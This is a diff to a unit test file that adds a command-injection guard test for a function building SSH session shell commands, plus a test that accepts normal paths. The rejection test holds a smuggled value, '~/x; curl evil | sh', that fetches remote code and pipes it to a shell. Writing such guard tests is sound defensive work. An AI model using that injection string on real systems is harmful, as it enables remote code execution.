@@ -24,4 +24,11 @@ describe('buildSessionShellCommand', () => {
   it('escapes single quotes in the key path', () => {
     expect(buildSessionShellCommand(target, "/a'b", false)).toContain("-i '/a'\\''b'");
   });
+  it('rejects a remotePath with shell metacharacters (command injection guard)', () => {
+    const evil = { ...target, remotePath: '~/x; curl evil | sh' };
+    expect(() => buildSessionShellCommand(evil, '/k', false)).toThrow(/remotePath/i);
+  });
+  it('accepts a normal ~-rooted remote path', () => {
+    expect(() => buildSessionShellCommand(target, '/k', false)).not.toThrow();
+  });
 });
